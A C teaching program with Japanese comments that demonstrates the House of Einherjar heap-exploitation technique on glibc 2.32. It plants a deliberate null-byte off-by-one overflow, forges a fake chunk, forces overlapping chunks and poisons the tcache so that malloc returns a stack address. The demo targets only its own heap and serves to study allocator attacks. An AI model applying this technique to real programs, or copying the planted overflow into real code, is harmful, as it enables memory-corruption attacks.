#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <malloc.h>
#include <assert.h>

int main()
{
	/*
	 * Huascar Tejeda (@htejeda) による House of Enherjar のこの改変は、glibc-2.32 で tcache オプションが有効な場合に動作します。
	 * House of Einherjar は、ヌルバイトによる off-by-one オーバーフローを使って、malloc() が返すポインタを制御します。
	 * 追加の要件として、ヒープのリークが必要です。
	 * 
	 * 偽チャンクとの併合に対する制限を回避するために tcache のリストを埋めたあと、
	 * ヒープ内に偽チャンクを作ることで、(small bin ではなく) unsorted bin を狙います。
	 * 通常の bin に対する次の制限により、この arena でシステムから確保されたメモリより
	 * 大きなチャンクを作ることはできません:
	 *
	 * https://sourceware.org/git/?p=glibc.git;a=commit;f=malloc/malloc.c;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c */

	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	printf("House of Einherjar 2 へようこそ!\n");
	printf("Ubuntu 20.10 64bit (glibc-2.32) でテストしています。\n");
	printf("この技法は、malloc された領域に対してヌルバイトによる off-by-one が可能な場合に使えます。\n");

	printf("このファイルは、チャンクの重なり (overlapping) の状況を作ることで house of einherjar 攻撃を示します。\n");
	printf("次に、tcache poisoning を使って制御フローを乗っ取ります。\n"
		   "https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41 のため、"
		   "tcache poisoning にはヒープのリークが必要になりました。\n");

	// 対象を準備します。
	// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41 により、
	// 適切にアラインされている必要があります。
	intptr_t stack_var[0x10];
	intptr_t *target = NULL;

	// 適切にアラインされた対象アドレスを選びます
	for(int i=0; i<0x10; i++) {
		if(((long)&stack_var[i] & 0xf) == 0) {
			target = &stack_var[i];
			break;
		}
	}
	assert(target != NULL);
	printf("\nmalloc() に返させたいアドレスは %p です。\n", (char *)target);

	printf("\n'a' のために 0x38 バイトを確保し、それを使って偽チャンクを作ります\n");
	intptr_t *a = malloc(0x38);

	// 偽チャンクを作ります
	printf("\n偽チャンクは、重ねたいチャンクより前に作るのが望ましく、そのアドレスを知っている必要があります。\n");
	printf("unlink のチェックを通すために、fwd と bck のポインタが fake_chunk 自身を指すように設定します\n");

	a[0] = 0;	// prev_size (使用しません)
	a[1] = 0x60; // size
	a[2] = (size_t) a; // fwd
	a[3] = (size_t) a; // bck

	printf("%p にある偽チャンクは次のようになっています:\n", a);
	printf("prev_size (使用しません): %#lx\n", a[0]);
	printf("size: %#lx\n", a[1]);
	printf("fwd: %#lx\n", a[2]);
	printf("bck: %#lx\n", a[3]);

	printf("\n'b' のために 0x28 バイトを確保します。\n"
		   "このチャンクは、'b' を 1 バイトのヌルバイトでオーバーフローさせ、'c' のメタデータに書き込むために使います\n"
		   "このチャンクが重なったあとは、解放して tcache poisoning 攻撃に使えます。\n");
	uint8_t *b = (uint8_t *) malloc(0x28);
	printf("b: %p\n", b);

	int real_b_size = malloc_usable_size(b);
	printf("'b' をオーバーフローさせたいので、丸められたあとの 'b' の「実際の」サイズが必要です: %#x\n", real_b_size);

	/* この場合、チャンクの size 属性の最下位バイトが 0x00 であると都合がよくなります。
	 * チャンクのサイズには、要求された量に加えてメタデータに必要な分が含まれるため、
	 * この最下位バイトは 0x00 になります。 */
	printf("\n'c' のために 0xf8 バイトを確保します。\n");
	uint8_t *c = (uint8_t *) malloc(0xf8);

	printf("c: %p\n", c);

	uint64_t* c_size_ptr = (uint64_t*)(c - 8);
	// この技法は、確保済みチャンクの size メタデータと prev_inuse ビットを上書きすることで成立します

	printf("\nc.size: %#lx\n", *c_size_ptr);
	printf("c.size は (0x100) | prev_inuse = 0x101 です\n");

	printf("'b' を 1 バイトのヌルバイトでオーバーフローさせ、'c' のメタデータに書き込みます\n");
	// VULNERABILITY
	b[real_b_size] = 0;
	// VULNERABILITY
	printf("c.size: %#lx\n", *c_size_ptr);

	printf("b.size が 0x100 の倍数であると、b のサイズは変わらず "
		   "prev_inuse ビットだけが変わるので、都合がよくなります\n");

	// b の末尾に偽の prev_size を書き込みます
	printf("\n'b' の最後の %lu バイトに偽の prev_size を書き込み、"
		   "偽チャンクと併合されるようにします\n", sizeof(size_t));
	size_t fake_size = (size_t)((c - sizeof(size_t) * 2) - (uint8_t*) a);
	printf("偽の prev_size は %p - %p = %#lx になります\n", c - sizeof(size_t) * 2, a, fake_size);
	*(size_t*) &b[real_b_size-sizeof(size_t)] = fake_size;

	// 偽チャンクの size を、c の新しい prev_size に合わせて変更します
	printf("\n偽チャンクの size が c の新しい prev_size と等しくなるようにします。\n");
	a[1] = fake_size;

	printf("偽チャンクの size は現在 %#lx です (b.size + fake_prev_size)\n", a[1]);

	// チャンク 'c' を解放して偽チャンクと併合させる前に、tcache を埋めます
	printf("\ntcache を埋めます。\n");
	intptr_t *x[0x10];
	for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++) {
		x[i] = malloc(0xf8);
	}

	printf("tcache のリストを埋めます。\n");
	for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++) {
		free(x[i]);
	}

	printf("ここで 'c' を解放します。'c' の prev_inuse が設定されていないため、偽チャンクと併合されます\n");
	free(c);
	printf("偽チャンクの size は現在 %#lx です (c.size + fake_prev_size)\n", a[1]);

	printf("\nここで malloc() を呼ぶと、偽チャンクから確保が始まります\n");

	intptr_t *d = malloc(0x158);
	printf("次の malloc(0x158) は %p にあります\n", d);

	// tcache poisoning(tcache の汚染)
	printf("パッチ https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f の適用後は、\n"
		   "fd ポインタを乗っ取る前に、パディング用にもう 1 つチャンクを作成して解放する必要があります。\n");
	uint8_t *pad = malloc(0x28);
	free(pad);

	printf("\nここでチャンク 'b' を解放して、tcache poisoning 攻撃を開始します\n");
	free(b);
	printf("これで tcache のリストは [ %p -> %p ] になりました。\n", b, pad);

	printf("チャンク 'd' を使って b の fwd ポインタを上書きします\n");
	// d のアドレスが既知であることを前提としているため、ヒープのリークが必要です。
	// house of einherjar もヒープのリークを必要とするので、ここではそれをそのまま使えます。
	d[0x30 / 8] = (long)target ^ ((long)&d[0x30/8] >> 12);

	// target を取り出します
	printf("これで対象のチャンクを取り出せます。\n");
	malloc(0x28);
	intptr_t *e = malloc(0x28);
	printf("\n新しいチャンクは %p にあります\n", e);

	// 確認用のチェック
	assert(e == target);
	printf("target/スタックの制御を奪いました!\n\n");
}
